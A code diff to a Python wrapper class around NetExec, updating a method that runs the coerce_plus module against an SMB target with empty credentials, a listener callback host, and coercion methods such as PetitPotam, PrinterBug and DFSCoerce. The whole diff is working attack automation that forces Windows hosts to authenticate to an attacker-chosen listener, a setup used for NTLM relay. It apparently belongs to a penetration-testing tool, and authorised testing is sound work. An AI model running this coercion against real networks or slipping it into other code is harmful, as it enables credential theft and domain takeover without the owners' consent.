@@ -24,25 +24,35 @@ class NxcController:
         target: str,
         method: str,
         callback_host: str,
+        always: bool = False,
     ) -> tuple[bool, str]:
-        """Run nxc coerce module against target."""
-        # NXC coerce syntax varies; common pattern:
-        # nxc smb <target> -u '' -p '' -M coerce -o LISTENER=<callback>
+        """Run nxc coerce_plus module against target.
+
+        Supports methods: PetitPotam, PrinterBug, DFSCoerce, ShadowCoerce, MSEven.
+        Use method='coerce_plus' or empty to run all checks.
+        """
+        options = f"LISTENER={callback_host}"
+        if method and method.lower() not in ("coerce_plus", "all", ""):
+            options += f" METHOD={method}"
+        if always:
+            options += " ALWAYS=true"
+
         cmd = [
             "smb",
             target,
             "-u", "''",
             "-p", "''",
-            "-M", "coerce",
-            "-o", f"LISTENER={callback_host}",
+            "-M", "coerce_plus",
+            "-o", options,
         ]
-        logger.info(f"[nxc coerce] {method} -> {target}")
+        logger.info(f"[nxc coerce_plus] {method or 'ALL'} -> {target} (listener={callback_host})")
         try:
             stdout = self._run(cmd)
-            success = "coerced" in stdout.lower() or "success" in stdout.lower()
+            # nxc coerce_plus prints "[+]" on successful coercion
+            success = "[+]" in stdout
             return success, stdout
         except Exception as exc:
-            logger.exception(f"nxc coerce failed on {target}")
+            logger.exception(f"nxc coerce_plus failed on {target}")
             return False, str(exc)
 
     def post_auth(
